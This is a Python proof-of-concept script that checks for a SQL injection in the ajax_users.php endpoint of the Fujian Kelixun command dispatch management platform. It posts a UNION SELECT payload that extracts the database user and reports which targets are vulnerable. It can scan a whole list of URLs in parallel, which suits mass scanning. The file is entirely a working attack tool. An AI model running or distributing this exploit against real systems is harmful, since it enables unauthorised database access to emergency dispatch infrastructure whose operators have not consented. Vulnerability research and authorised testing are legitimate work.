import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """

         ____  _______ 
  /\ /\ / /\ \/ /__   \
 / //_// /  \  /  / /\/
/ __ \/ /___/  \ / /   
\/  \/\____/_/\_\\/    
                       

"""
    print(test)


def poc(target):
    payload = "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,user(),0x7e),NULL,NULL,NULL-- -"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = "/app/ext/ajax_users.php"
    try:
        response = requests.post(target + path, data=payload, headers=headers, timeout=10, verify=False)
        if "~" in response.text:
            print(f"[+] {target} 存在福建科立讯通信 指挥调度管理平台 ajax_users.php SQL 注入漏洞)")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description=" 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL 注入漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()